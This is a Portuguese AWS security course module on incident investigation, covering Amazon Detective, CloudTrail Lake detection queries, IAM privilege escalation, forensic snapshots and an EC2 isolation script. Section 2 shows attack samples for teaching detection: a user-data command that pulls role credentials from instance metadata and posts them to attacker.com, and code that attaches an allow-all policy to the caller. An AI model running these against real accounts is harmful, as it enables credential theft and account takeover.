# Módulo 05 — Investigação de Incidentes em AWS

**Curso 3: AWS Cloud Security Operations · CECyber**
**Carga Horária:** 4 horas (1h videoaula + 2h laboratório + 1h live)
**Certificação:** AWS Certified Security – Specialty (SCS-C02) — Domínio 4 (Incident Response)

---

## Objetivos de Aprendizagem

Ao concluir este módulo, o aluno será capaz de:

1. Usar o Amazon Detective para investigar findings do GuardDuty via behavior graphs
2. Construir timelines de incidentes com CloudTrail Lake e SQL avançado
3. Identificar técnicas de escalada de privilégios via IAM (PassRole, AssumeRole chains)
4. Executar preservação de evidências forenses em AWS (EBS snapshots, chain of custody)
5. Isolar instâncias EC2 comprometidas seguindo procedimentos de IR
6. Automatizar isolamento de EC2 com Python/Boto3

---

## 1. Amazon Detective

O Amazon Detective correlaciona dados de múltiplas fontes (GuardDuty, CloudTrail, VPC Flow Logs) em um behavior graph que permite investigações visuais de incidentes.

### Como o Detective Coleta Dados

| Fonte | O que Provê | Período de Retenção |
|---|---|---|
| **GuardDuty Findings** | Ponto de partida para investigações; pivot para entidades relacionadas | 1 ano |
| **CloudTrail** | API calls, identidades, IPs de origem | 1 ano |
| **VPC Flow Logs** | Conexões de rede, volumes de tráfego, peers | 1 ano |
| **EKS Audit Logs** | Atividade de API Kubernetes | 1 ano |
| **Security Hub Findings** | Achados adicionais de postura e conformidade | 1 ano |

### Técnica de Investigação: Pivot de Finding → Entidades

```
GuardDuty Finding (HIGH)
UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration
        │
        └──► [Amazon Detective]
                │
    ┌───────────┼──────────────┐
    ▼           ▼              ▼
IAM Principal  AWS Account   Resource
(joao.silva)   (444444444444)  (i-0a1b2c3d)
    │                          │
    ▼                          ▼
API Calls Timeline         Network Connections
- CreateUser (22:15)      - 10.0.1.50:443 → 185.12.4.1
- AttachUserPolicy (22:17) - bytes: 2.3 GB (exfiltração)
- CreateAccessKey (22:18)
    │
    ▼
Geolocalização dos IPs
- 22:10: São Paulo, BR (normal)
- 22:30: Moscou, RU (ANÔMALO)
```

### Fluxo de Investigação com Detective

1. **Pivot do GuardDuty:** Abrir finding HIGH no GuardDuty → "Investigate in Detective"
2. **Identificar a entidade comprometida:** Usuário IAM, instância EC2 ou role
3. **Analisar o behavior graph:** Volume de API calls, horário, geolocalização dos IPs
4. **Expandir para entidades relacionadas:** Quais recursos foram acessados? Quais roles foram assumidas?
5. **Construir timeline:** Do acesso inicial até as últimas ações conhecidas
6. **Identificar o vetor inicial:** Como o atacante obteve acesso?

---

## 2. Técnicas de Privilege Escalation via IAM

### PassRole Abuse

A permissão `iam:PassRole` permite que uma entidade "passe" uma role para um serviço AWS. Mal configurada, permite escalada de privilégios.

```
Atacante tem:
  - iam:PassRole (para qualquer role)
  - ec2:RunInstances

Técnica:
  1. Criar instância EC2 passando uma role com AdministratorAccess
  2. Acessar a instância via Session Manager
  3. Obter credenciais da role via Instance Metadata Service
  4. Usar credenciais privilegiadas para ações administrativas

Exemplo de chamada maliciosa:
aws ec2 run-instances \
  --image-id ami-xxx \
  --instance-type t3.micro \
  --iam-instance-profile Name=AdminProfile  # Role privilegiada passada!
  --user-data "curl 169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole >> /tmp/creds && curl -X POST https://attacker.com -d @/tmp/creds"
```

**Detecção:** CloudTrail mostrará `RunInstances` com `iamInstanceProfile.arn` referenciando uma role privilegiada, seguido de `GetCredentials` no IMDS.

### AssumeRole Chains

```
Conta Comprometida → AssumeRole → Conta Confiável → AssumeRole → Conta Admin

Exemplo:
1. Atacante compromete joao.silva em conta Development (555555555555)
2. joao.silva tem permissão de AssumeRole para DevOpsRole na conta Production
3. DevOpsRole tem permissão de AssumeRole para AdminRole na conta Management
4. Atacante agora tem acesso de admin na Management Account

Cada hop usa: aws sts assume-role --role-arn arn:... --role-session-name AuditSession
```

**Detecção:** Procurar por `AssumeRole` events com `sourceIdentity` diferente do usuário original, e cadeia de roles com `AssumedRole` → `AssumedRole` → `AssumedRole` no CloudTrail.

### CreatePolicy + AttachUserPolicy (Self-Privilege Escalation)

```python
# Atacante com permissões: iam:CreatePolicy + iam:AttachUserPolicy

import boto3

iam = boto3.client('iam')

# 1. Criar política com AdministratorAccess
policy = iam.create_policy(
    PolicyName='TemporaryAdmin',
    PolicyDocument='{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
)

# 2. Anexar à própria conta
iam.attach_user_policy(
    UserName='joao.silva',  # próprio usuário
    PolicyArn=policy['Policy']['Arn']
)

# Resultado: joao.silva agora tem AdministratorAccess
```

**Detecção:** Query CloudTrail Lake — `CreatePolicy` seguido imediatamente de `AttachUserPolicy` pela mesma identidade, especialmente fora do horário comercial.

### Enumerar Permissões via SimulatePrincipalPolicy

```bash
# Atacante com iam:SimulatePrincipalPolicy pode descobrir TODAS as suas permissões
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::444444444444:user/joao.silva \
  --action-names "iam:CreateUser" "s3:DeleteBucket" "ec2:TerminateInstances" \
  --resource-arns "*"

# Resposta indica allowed/denied para cada ação
# Permite ao atacante conhecer exatamente o que pode fazer sem gerar alarmes
```

**Detecção:** `SimulatePrincipalPolicy` no CloudTrail, especialmente para simular ações sensíveis (IAM, Organizations, CloudTrail).

---

## 3. Query CloudTrail Lake para Detectar PassRole Abuse

```sql
-- Detecção de PassRole Abuse no Banco Meridian
-- Procura por instâncias EC2 criadas com roles privilegiadas por identidades não autorizadas

WITH instance_creations AS (
    -- Passo 1: Encontrar todas as criações de EC2 com instance profile
    SELECT
        eventTime,
        userIdentity.arn AS creator_arn,
        userIdentity.type AS creator_type,
        sourceIPAddress,
        awsRegion,
        json_extract_scalar(requestParameters, '$.iamInstanceProfile.arn') AS attached_role_arn,
        json_extract_scalar(responseElements, '$.instancesSet.items[0].instanceId') AS instance_id
    FROM $EDS_ID
    WHERE
        eventName = 'RunInstances'
        AND json_extract_scalar(requestParameters, '$.iamInstanceProfile.arn') IS NOT NULL
        AND eventTime > DATE_ADD('day', -7, NOW())
),
privileged_roles AS (
    -- Passo 2: Identificar roles com acesso privilegiado (AdministratorAccess ou PowerUser)
    SELECT
        json_extract_scalar(requestParameters, '$.roleName') AS role_name,
        json_extract_scalar(requestParameters, '$.policyArn') AS policy_arn
    FROM $EDS_ID
    WHERE
        eventName = 'AttachRolePolicy'
        AND json_extract_scalar(requestParameters, '$.policyArn') IN (
            'arn:aws:iam::aws:policy/AdministratorAccess',
            'arn:aws:iam::aws:policy/PowerUserAccess',
            'arn:aws:iam::aws:policy/IAMFullAccess'
        )
)
-- Passo 3: Correlacionar criações com roles privilegiadas
SELECT
    ic.eventTime,
    ic.creator_arn,
    ic.creator_type,
    ic.sourceIPAddress,
    ic.awsRegion,
    ic.attached_role_arn,
    ic.instance_id,
    'PASSROLE_ABUSE_SUSPEITO' AS alert_type
FROM
    instance_creations ic
WHERE
    -- Verificar se a role attached é privilegiada
    ic.attached_role_arn LIKE '%Admin%'
    OR ic.attached_role_arn LIKE '%PowerUser%'
    -- E o criador NÃO é do time de infraestrutura aprovado
    AND ic.creator_arn NOT LIKE '%InfrastructureProvisioningRole%'
ORDER BY
    ic.eventTime DESC
```

---

## 4. Forense em AWS

### Preservação de Evidências — Processo Oficial

```
FASE 1 — IDENTIFICAÇÃO
├── Identificar todos os recursos envolvidos no incidente
├── Documentar estado atual (tags, configurações, IPs)
└── Estabelecer scope (uma conta? multi-conta? uma região?)

FASE 2 — PRESERVAÇÃO (antes de qualquer ação)
├── CloudTrail: verificar que logs estão íntegros (Log File Validation)
├── VPC Flow Logs: garantir que não foram interrompidos
├── EBS Snapshot: criar snapshot de TODOS os volumes da instância
├── Memory dump: se Runtime Monitoring ativo, GuardDuty pode capturar
└── Metadados: salvar estado de Security Groups, IAM roles, etc.

FASE 3 — ISOLAMENTO
├── Mover instância para Security Group de quarentena
├── Remover IAM role da instância (impede novas credenciais)
├── Revogar sessões ativas via STS
└── NÃO terminar a instância ainda

FASE 4 — ANÁLISE
├── Montar snapshot EBS em instância de análise (read-only)
├── Analisar artefatos: logs, arquivos temporários, processos
├── Correlacionar com CloudTrail Lake (timeline)
└── Usar Detective para pivot de entidades

FASE 5 — DOCUMENTAÇÃO
├── Timeline cronológica de eventos
├── Chain of custody dos snapshots
├── Hash SHA256 dos artefatos coletados
└── Relatório de IR (NIST SP 800-61)
```

### Criação de Snapshot para Preservação Forense

```python
import boto3
import datetime
import hashlib
import json

def preservar_evidencias_ec2(instance_id: str, incident_id: str, region: str = 'sa-east-1'):
    """
    Preserva evidências forenses de uma instância EC2 comprometida.
    Cria snapshots de todos os volumes com tags de cadeia de custódia.
    """
    ec2 = boto3.client('ec2', region_name=region)
    timestamp = datetime.datetime.utcnow().isoformat()

    # 1. Obter informações da instância
    response = ec2.describe_instances(InstanceIds=[instance_id])
    instance = response['Reservations'][0]['Instances'][0]

    # 2. Documentar estado atual
    evidencias = {
        'incident_id': incident_id,
        'instance_id': instance_id,
        'preservation_timestamp': timestamp,
        'instance_state': instance['State']['Name'],
        'security_groups': [sg['GroupId'] for sg in instance.get('SecurityGroups', [])],
        'iam_profile': instance.get('IamInstanceProfile', {}).get('Arn', 'None'),
        'public_ip': instance.get('PublicIpAddress', 'None'),
        'private_ip': instance.get('PrivateIpAddress', 'None'),
        'vpc_id': instance.get('VpcId', 'None'),
        'subnet_id': instance.get('SubnetId', 'None'),
        'volumes': []
    }

    # 3. Criar snapshot de cada volume
    volumes = [vol['Ebs']['VolumeId'] for vol in instance.get('BlockDeviceMappings', [])]

    for volume_id in volumes:
        snapshot_response = ec2.create_snapshot(
            VolumeId=volume_id,
            Description=f"IR-{incident_id}-FORENSIC-{instance_id}-{timestamp}",
            TagSpecifications=[{
                'ResourceType': 'snapshot',
                'Tags': [
                    {'Key': 'IncidentId', 'Value': incident_id},
                    {'Key': 'SourceInstance', 'Value': instance_id},
                    {'Key': 'PreservationTimestamp', 'Value': timestamp},
                    {'Key': 'ChainOfCustody', 'Value': 'Collected by IR automation'},
                    {'Key': 'Classification', 'Value': 'ForensicEvidence'},
                    {'Key': 'DataClassification', 'Value': 'Confidential'}
                ]
            }]
        )

        snapshot_id = snapshot_response['SnapshotId']
        evidencias['volumes'].append({
            'volume_id': volume_id,
            'snapshot_id': snapshot_id,
            'device': next(
                (vol['DeviceName'] for vol in instance.get('BlockDeviceMappings', [])
                 if vol['Ebs']['VolumeId'] == volume_id),
                'unknown'
            )
        })

        print(f"Snapshot criado: {snapshot_id} para volume {volume_id}")

    # 4. Calcular hash da documentação para chain of custody
    doc_json = json.dumps(evidencias, sort_keys=True)
    doc_hash = hashlib.sha256(doc_json.encode()).hexdigest()
    evidencias['documentation_hash'] = doc_hash

    print(f"\nPreservação concluída para instância {instance_id}")
    print(f"Incident ID: {incident_id}")
    print(f"Volumes preservados: {len(volumes)}")
    print(f"Hash de documentação (chain of custody): {doc_hash}")
    print(f"\nDocumentação: {json.dumps(evidencias, indent=2)}")

    return evidencias
```

---

## 5. Script Python — Isolamento Automático de EC2

```python
import boto3
import json
import time
import logging
from typing import Optional

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)

def isolar_instancia_ec2(
    instance_id: str,
    account_id: str,
    region: str,
    incident_id: str,
    criar_snapshot: bool = True
) -> dict:
    """
    Isola completamente uma instância EC2 comprometida.

    Ações executadas:
    1. Criar Security Group de quarentena (sem ingress/egress)
    2. Mover instância para o SG de quarentena
    3. Remover IAM role (opcional, com cautela)
    4. Criar snapshot de todos os volumes para forense
    5. Adicionar tags de quarentena
    6. Notificar via SNS

    Args:
        instance_id: ID da instância a isolar
        account_id: ID da conta AWS
        region: Região da instância
        incident_id: ID do incidente para rastreamento
        criar_snapshot: Se True, cria snapshot antes de isolar

    Returns:
        Dicionário com resultado do isolamento
    """
    ec2 = boto3.client('ec2', region_name=region)
    sns = boto3.client('sns', region_name=region)
    resultado = {'instance_id': instance_id, 'incident_id': incident_id, 'acoes': []}

    # --- PASSO 1: Obter informações da instância ---
    logger.info(f"Obtendo informações da instância {instance_id}...")
    try:
        resp = ec2.describe_instances(InstanceIds=[instance_id])
        instancia = resp['Reservations'][0]['Instances'][0]
        vpc_id = instancia['VpcId']
        sgs_originais = [sg['GroupId'] for sg in instancia.get('SecurityGroups', [])]
        resultado['vpc_id'] = vpc_id
        resultado['security_groups_originais'] = sgs_originais
        logger.info(f"VPC: {vpc_id}, SGs originais: {sgs_originais}")
    except Exception as e:
        logger.error(f"Falha ao obter instância: {e}")
        raise

    # --- PASSO 2: Criar Security Group de quarentena ---
    logger.info("Criando Security Group de quarentena...")
    try:
        sg_response = ec2.create_security_group(
            GroupName=f"QUARENTENA-{incident_id}-{instance_id}",
            Description=f"Quarentena IR {incident_id} - SEM TRAFEGO PERMITIDO",
            VpcId=vpc_id,
            TagSpecifications=[{
                'ResourceType': 'security-group',
                'Tags': [
                    {'Key': 'Name', 'Value': f'QUARENTENA-{incident_id}'},
                    {'Key': 'IncidentId', 'Value': incident_id},
                    {'Key': 'Quarantine', 'Value': 'true'},
                    {'Key': 'CreatedBy', 'Value': 'IR-Automation'}
                ]
            }]
        )
        sg_quarentena_id = sg_response['GroupId']
        resultado['sg_quarentena'] = sg_quarentena_id

        # Remover regra de egress padrão (0.0.0.0/0 all traffic)
        ec2.revoke_security_group_egress(
            GroupId=sg_quarentena_id,
            IpPermissions=[{
                'IpProtocol': '-1',
                'IpRanges': [{'CidrIp': '0.0.0.0/0'}]
            }]
        )

        # Adicionar APENAS acesso SSH para o time de IR (range interno)
        ec2.authorize_security_group_ingress(
            GroupId=sg_quarentena_id,
            IpPermissions=[{
                'IpProtocol': 'tcp',
                'FromPort': 22,
                'ToPort': 22,
                'IpRanges': [
                    {'CidrIp': '10.0.200.0/24', 'Description': 'IR Team VPN range'}
                ]
            }]
        )

        resultado['acoes'].append(f"SG quarentena criado: {sg_quarentena_id}")
        logger.info(f"SG quarentena criado: {sg_quarentena_id}")
    except Exception as e:
        logger.error(f"Falha ao criar SG de quarentena: {e}")
        raise

    # --- PASSO 3: Criar snapshot antes de modificar (preservação de evidências) ---
    if criar_snapshot:
        logger.info("Criando snapshots de preservação de evidências...")
        try:
            evidencias = preservar_evidencias_ec2(instance_id, incident_id, region)
            resultado['evidencias'] = evidencias
            resultado['acoes'].append(f"Snapshots criados: {len(evidencias['volumes'])} volumes")
        except Exception as e:
            logger.warning(f"Falha ao criar snapshots: {e}. Continuando isolamento...")

    # --- PASSO 4: Mover instância para SG de quarentena ---
    logger.info(f"Movendo instância {instance_id} para SG de quarentena...")
    try:
        ec2.modify_instance_attribute(
            InstanceId=instance_id,
            Groups=[sg_quarentena_id]
        )
        resultado['acoes'].append("Instância movida para SG de quarentena")
        logger.info("Instância isolada com sucesso no SG de quarentena")
    except Exception as e:
        logger.error(f"Falha ao modificar SG da instância: {e}")
        raise

    # --- PASSO 5: Adicionar tags de quarentena na instância ---
    logger.info("Adicionando tags de quarentena...")
    try:
        ec2.create_tags(
            Resources=[instance_id],
            Tags=[
                {'Key': 'Quarantine', 'Value': 'true'},
                {'Key': 'IncidentId', 'Value': incident_id},
                {'Key': 'QuarantineTimestamp', 'Value': time.strftime('%Y-%m-%dT%H:%M:%SZ')},
                {'Key': 'OriginalSecurityGroups', 'Value': ','.join(sgs_originais)}
            ]
        )
        resultado['acoes'].append("Tags de quarentena adicionadas")
    except Exception as e:
        logger.warning(f"Falha ao adicionar tags: {e}")

    # --- PASSO 6: Notificar time de segurança ---
    logger.info("Notificando time de segurança...")
    try:
        mensagem = {
            'assunto': f'INCIDENTE {incident_id}: Instância EC2 isolada',
            'instancia': instance_id,
            'conta': account_id,
            'regiao': region,
            'sg_quarentena': sg_quarentena_id,
            'sgs_originais': sgs_originais,
            'snapshots': len(resultado.get('evidencias', {}).get('volumes', [])),
            'proximos_passos': [
                'Analisar snapshots em instância de forense (read-only)',
                'Revisar CloudTrail Lake para timeline do comprometimento',
                'Usar Amazon Detective para identificar vetor inicial',
                'Documentar findings no ITSM'
            ]
        }
        sns.publish(
            TopicArn=f'arn:aws:sns:{region}:{account_id}:MeridianSecurityAlerts-HIGH',
            Subject=f'[INCIDENTE] EC2 Isolada: {instance_id}',
            Message=json.dumps(mensagem, indent=2, ensure_ascii=False)
        )
        resultado['acoes'].append("Notificação enviada ao time de segurança")
    except Exception as e:
        logger.warning(f"Falha ao enviar notificação SNS: {e}")

    resultado['status'] = 'ISOLAMENTO_CONCLUIDO'
    logger.info(f"\nResumo do isolamento:\n{json.dumps(resultado, indent=2)}")
    return resultado


def preservar_evidencias_ec2(instance_id: str, incident_id: str, region: str) -> dict:
    """Wrapper simplificado — ver função completa na seção 4."""
    ec2 = boto3.client('ec2', region_name=region)
    resp = ec2.describe_instances(InstanceIds=[instance_id])
    instance = resp['Reservations'][0]['Instances'][0]
    volumes = [vol['Ebs']['VolumeId'] for vol in instance.get('BlockDeviceMappings', [])]
    snapshots = []
    for vol_id in volumes:
        snap = ec2.create_snapshot(
            VolumeId=vol_id,
            Description=f"IR-{incident_id}-{instance_id}",
            TagSpecifications=[{'ResourceType': 'snapshot', 'Tags': [
                {'Key': 'IncidentId', 'Value': incident_id},
                {'Key': 'ForensicEvidence', 'Value': 'true'}
            ]}]
        )
        snapshots.append({'volume_id': vol_id, 'snapshot_id': snap['SnapshotId']})
    return {'volumes': snapshots}


# --- Exemplo de uso ---
if __name__ == "__main__":
    resultado = isolar_instancia_ec2(
        instance_id='i-0a1b2c3d4e5f67890',
        account_id='444444444444',
        region='sa-east-1',
        incident_id='INC-2026-0042',
        criar_snapshot=True
    )
    print(f"\nStatus final: {resultado['status']}")
    print(f"Ações executadas: {len(resultado['acoes'])}")
    for acao in resultado['acoes']:
        print(f"  ✓ {acao}")
```

---

## 6. Atividades de Fixação

**1.** O Amazon Detective gerou um behavior graph mostrando que o usuário IAM `ana.costa` fez 847 chamadas `GetObject` no S3 em um período de 10 minutos, com origem no IP `185.220.101.15` (Tor exit node). O comportamento normal da `ana.costa` é 10-20 chamadas por hora. O que esse padrão indica e qual a resposta?

a) Comportamento normal de desenvolvimento — ignorar
b) Possível comprometimento de credenciais com exfiltração de dados — resposta imediata
c) Backup automático disparado — verificar schedule
d) Scanner de segurança autorizado — verificar com o time

**Gabarito: B** — O padrão é altamente suspeito: (1) volume 40x acima do normal, (2) IP de Tor exit node (tipicamente usado para anonimização por atacantes), (3) GetObject = download de dados = exfiltração. Resposta imediata: desativar access key/revogar sessão de `ana.costa`, verificar via CloudTrail quais objetos foram acessados, notificar DPO se dados pessoais foram expostos, iniciar processo de notificação LGPD se confirmado.

---

**2.** Descreva como o PassRole abuse difere de uma criação comum de instância EC2 com uma role, e como o CloudTrail captura ambos os cenários de forma diferente.

a) PassRole abuse é indetectável no CloudTrail; criação normal é registrada
b) Ambos geram evento `RunInstances`; o abuse é identificado por quem executa vs qual role é passada
c) PassRole abuse usa API diferente (`PassRole` diretamente); criação normal usa `RunInstances`
d) O CloudTrail não registra nenhum dos dois cenários

**Gabarito: B** — Ambos geram o mesmo evento `RunInstances` no CloudTrail. A diferença é contextual: (1) Quem está criando? Uma role privilegiada criando instância com role limitada = normal. Uma role limitada criando instância com role privilegiada = PassRole abuse. (2) O campo `requestParameters.iamInstanceProfile.arn` revela a role being passed. (3) Correlacionar com os privilégios do criador: se o criador não deveria ter acesso às permissões da role que está passando, é abuse.

---

**3.** Durante uma investigação de incidente, você encontra a seguinte cadeia de eventos no CloudTrail Lake: 14:00 `GetCallerIdentity` (reconhecimento), 14:02 `ListRoles`, 14:05 `AssumeRole para SecurityAuditRole`, 14:08 `CreatePolicy (AdministratorAccess)`, 14:09 `AttachUserPolicy`. O que essa sequência de eventos descreve?

a) Operação de auditoria legítima — analista verificando conformidade
b) Técnica de privilege escalation — atacante escalando de SecurityAuditRole para AdministratorAccess
c) Deploy automatizado de infraestrutura via IaC
d) Rotação de credenciais automatizada

**Gabarito: B** — Sequência clássica de privilege escalation: (1) GetCallerIdentity = "quem sou eu?", (2) ListRoles = "quais roles posso assumir?", (3) AssumeRole para role de auditoria (provavelmente com permissões de iam:CreatePolicy), (4) CreatePolicy com AdministratorAccess, (5) AttachUserPolicy = anexar a política privilegiada ao próprio usuário. Este é o padrão de attack técnica T1078 (Valid Accounts) + T1548 (Abuse Elevation Control Mechanism) do MITRE ATT&CK para AWS.

---

**4.** Por que é importante criar snapshots EBS ANTES de isolar a instância EC2 comprometida, e não depois?

a) Não importa a ordem; o conteúdo do snapshot é o mesmo
b) Após modificar o Security Group, o SO da instância pode detectar o isolamento e executar malware de limpeza (wiper)
c) Snapshots EBS só podem ser criados enquanto a instância está online
d) Isolar primeiro facilita a criação do snapshot

**Gabarito: B** — Malware sofisticado pode detectar mudanças de rede (perda de conectividade) e executar rotinas de limpeza: deletar logs locais, sobrescrever arquivos, criptografar evidências. Ao criar o snapshot antes, preservamos o estado do disco no momento do comprometimento, antes de qualquer chance de limpeza. Também garante a chain of custody: o snapshot reflete o estado no momento da descoberta do incidente.

---

**5.** O que é a técnica de "assume role chaining" e como ela difere de um único AssumeRole?

a) São equivalentes; apenas terminologia diferente
b) Chaining envolve múltiplos AssumeRole sequenciais criando uma cadeia de identidades temporárias, dificultando rastreamento e podendo cruzar fronteiras de conta
c) Chaining só funciona em AWS Organizations com SCPs
d) Chaining usa uma única sessão STS com múltiplas roles simultâneas

**Gabarito: B** — Assume role chaining: identidade A assume role B, que assume role C, que assume role D. Cada hop gera novas credenciais temporárias com nova session name. Dificulta investigação porque: (1) cada hop precisa ser rastreado no CloudTrail da conta respectiva, (2) pode cruzar múltiplas contas (cada uma com logs separados), (3) as sessões têm duração máxima de 1h quando em chains. Para o Banco Meridian, a CloudTrail Lake organization-wide facilita rastrear chains cross-account com uma única query.

---

## 7. Roteiro de Gravação

### Aula 5.1 — Detective e Investigação Forense AWS (55 min)

**Abertura (3 min):**
"Bem-vindos ao Módulo 5 — Investigação de Incidentes. Hoje vamos ao fundo da toca: um incidente aconteceu no Banco Meridian. Como investigamos? Onde procuramos? Como preservamos evidências para o jurídico? Como isolamos o problema sem destruir a cena do crime?

Vamos usar o cenário do Módulo 10 de forma antecipada para praticar: credencial IAM comprometida, exfiltração de dados, movimento lateral. Cada ferramenta que vermos hoje vai se encaixar em uma fase da investigação."

**Bloco 1 — Amazon Detective (15 min):**
"[Abrir console Amazon Detective]

Detective funciona melhor quando você começa a partir de um finding do GuardDuty. [Abrir GuardDuty — finding HIGH de InstanceCredentialExfiltration]

Botão 'Investigate in Detective'. [Click]

Agora estamos no behavior graph do Detective. Vejo:
- O usuário IAM comprometido no centro
- Conexões para recursos que ele acessou
- Timeline de atividade

[Pivot para o IP de origem]
Clico no IP externo que foi usado. O Detective me mostra: esse IP nunca havia sido visto antes nessa conta. Geolocalização: Moscou. Horário: 03h BRT.

[Pivot para os recursos acessados]
A identidade comprometida acessou 3 buckets S3, 1 role IAM (AssumeRole), e tentou acessar o KMS. Volume de dados: 2.3 GB em S3.

Agora tenho a história completa: atacante obteve credenciais, usou de IP russo às 3h, baixou 2.3 GB do S3, tentou assumir role adicional (foi bloqueado pela SCP), tentou acessar KMS.

[Mostrar o timeline visual do Detective]
Esse timeline é ouro para construir o relatório de IR."

**Bloco 2 — CloudTrail Lake para IR (15 min):**
"Detective nos deu a visão macro. CloudTrail Lake nos dá os detalhes técnicos.

[Executar query de timeline completo]

Vou reconstruir os últimos 7 dias de atividade do usuário comprometido:
```sql
SELECT eventTime, eventName, sourceIPAddress, awsRegion, resources
FROM $EDS_ID
WHERE userIdentity.arn = 'arn:aws:iam::444444444444:user/ana.costa'
ORDER BY eventTime DESC
```

[Mostrar resultado]

Aqui vejo o momento exato em que o comportamento mudou. Antes de 02:45: chamadas normais do IP 189.42.x.x (SP). Depois de 02:45: chamadas do IP 185.220.x.x (Tor/Rússia). Esse é o momento de comprometimento.

[Executar query de privilege escalation]
Verificar se houve tentativa de escalada de privilégios após o comprometimento."

**Bloco 3 — Técnicas de Privilege Escalation (10 min):**
"[Explicar PassRole abuse com diagrama]

Mas antes de executar qualquer coisa, o atacante vai tentar entender o que pode fazer. SimulatePrincipalPolicy é o primeiro passo — ele 'pergunta' ao IAM o que tem permissão de fazer, sem executar de verdade.

[Mostrar query CloudTrail Lake para SimulatePrincipalPolicy]

Depois, se encontrar que tem PassRole, vai tentar criar uma EC2 com role privilegiada. É simples, silencioso, e frequentemente não é detectado por equipes sem regras específicas para isso.

Para a prova SCS-C02: PassRole + ec2:RunInstances é a combinação mais comum de privilege escalation. Sempre verifique quem tem essa combinação de permissões nos seus IAM reviews."

**Bloco 4 — Forense e Isolamento (12 min):**
"[Demo ao vivo — script Python de isolamento]

Vou executar o script de isolamento para a instância comprometida no nosso ambiente de lab:

```python
resultado = isolar_instancia_ec2(
    instance_id='i-0lab123',
    account_id='444444444444',
    region='sa-east-1',
    incident_id='INC-2026-LAB-001',
    criar_snapshot=True
)
```

[Mostrar execução passo a passo]

Passo 1: Snapshot criado — evidências preservadas.
Passo 2: SG de quarentena criado — nenhum tráfego autorizado exceto SSH do range de IR.
Passo 3: Instância movida para SG de quarentena.
Passo 4: Tags de quarentena adicionadas.
Passo 5: SNS notificação enviada.

Em 30 segundos, a instância está isolada, as evidências estão preservadas, e o time de segurança está notificado."

**Bloco 5 — Chain of Custody e Documentação (5 min):**
"[Falar sobre requisitos forenses]

Para que as evidências sejam admissíveis em procedimentos legais ou regulatórios (ex: comunicação ao BACEN de incidente), precisamos de chain of custody:
- Quem coletou as evidências e quando
- Hash SHA256 de cada artefato
- Registro de quem acessou as evidências após coleta
- Snapshots com tags de classificação Confidential

O script que fizemos já incorpora esses elementos. Em um SOC maduro, isso é integrado com o ITSM (ServiceNow, Jira) para registro automático."

**Fechamento (0 min):**
"No próximo módulo, proteção de dados: KMS, Secrets Manager, CloudHSM, Macie e S3 security. Até lá!"

---

## 8. Avaliação do Módulo

**Questão 1 (2 pontos):** O Amazon Detective identificou que nos últimos 7 dias, a role `EC2ApplicationRole` da instância `i-0x1y2z3w` fez 12.000 chamadas `DescribeInstances` — 300x acima do baseline normal. Qual das seguintes hipóteses é mais provável e como você a confirmaria?

**Gabarito:** Hipóteses mais prováveis: (1) Malware de reconhecimento instalado na instância (comum em cryptominers que mapeiam o ambiente antes de propagar). (2) Bug de aplicação em loop infinito. Confirmação: (1) Analisar CloudTrail Lake — as chamadas são uniformemente distribuídas (bug) ou têm padrão de burst (reconhecimento)? (2) Verificar GuardDuty — há finding de Discovery ou CryptoCurrency para essa instância? (3) Verificar Inspector — há vulnerabilidades CRITICAL na instância? (4) Analisar VPC Flow Logs — há conexões externas suspeitas saindo da instância? Se reconhecimento confirmado: isolar e executar Malware Protection scan.

---

**Questão 2 (2 pontos):** Escreva a query SQL para o CloudTrail Lake que retorna todos os eventos de `AssumeRole` na última semana onde o `roleSessionName` é diferente do padrão aprovado pelo Banco Meridian, ordenado por conta e horário.

**Gabarito:**
```sql
SELECT
    eventTime,
    userIdentity.arn AS assumindo_identidade,
    userIdentity.accountId AS conta_origem,
    json_extract_scalar(requestParameters, '$.roleArn') AS role_assumida,
    json_extract_scalar(requestParameters, '$.roleSessionName') AS session_name,
    sourceIPAddress,
    awsRegion
FROM $EDS_ID
WHERE
    eventName = 'AssumeRole'
    AND eventSource = 'sts.amazonaws.com'
    AND json_extract_scalar(requestParameters, '$.roleSessionName') NOT LIKE 'MERIDIAN-%'
    AND json_extract_scalar(requestParameters, '$.roleSessionName') NOT LIKE 'terraform-%'
    AND json_extract_scalar(requestParameters, '$.roleSessionName') NOT LIKE 'sso-session-%'
    AND eventTime > DATE_ADD('day', -7, NOW())
ORDER BY
    userIdentity.accountId,
    eventTime DESC
```

---

**Questão 3 (2 pontos):** Por que o Amazon Detective requer que o Amazon GuardDuty esteja habilitado, e qual é a relação funcional entre os dois serviços?

**Gabarito:** Detective consome dados do GuardDuty como uma das suas fontes primárias. GuardDuty é o detector que gera os findings; Detective é o investigador que expande o contexto desses findings. Tecnicamente: (1) GuardDuty envia seus findings para o Detective automaticamente quando ambos estão habilitados. (2) Detective usa os mesmos dados base do GuardDuty (CloudTrail, VPC Flow Logs, DNS) para construir o behavior graph. (3) O workflow de IR começa no GuardDuty (finding) e continua no Detective (investigação). Sem GuardDuty, Detective ainda funciona com CloudTrail e VPC Flow Logs, mas perde a integração de findings e o pivot "Investigate in Detective".

---

**Questão 4 (2 pontos):** Um analista recebeu um snapshot EBS para análise forense. Como ele deve montar o snapshot para análise sem contaminar as evidências?

**Gabarito:** Procedimento seguro: (1) Criar uma instância EC2 dedicada de análise forense em subnet isolada (sem acesso à internet). (2) Criar volume a partir do snapshot: `aws ec2 create-volume --snapshot-id snap-xxx --availability-zone sa-east-1a`. (3) Anexar o volume à instância de análise: `aws ec2 attach-volume --volume-id vol-xxx --instance-id i-forensic --device /dev/sdf`. (4) Montar em modo READ-ONLY: `mount -o ro /dev/sdf /mnt/evidencia`. (5) Calcular hash do volume antes de qualquer acesso: `sha256sum /dev/sdf > /forensic/hash_evidencia.txt`. (6) Toda análise deve ser feita em cópias dos arquivos, nunca nos originais. (7) Documentar cada ação com timestamp para chain of custody.

---

**Questão 5 (2 pontos):** Descreva como a técnica de `iam:CreatePolicyVersion` pode ser usada para escalada de privilégios e como o CloudTrail captura essa atividade.

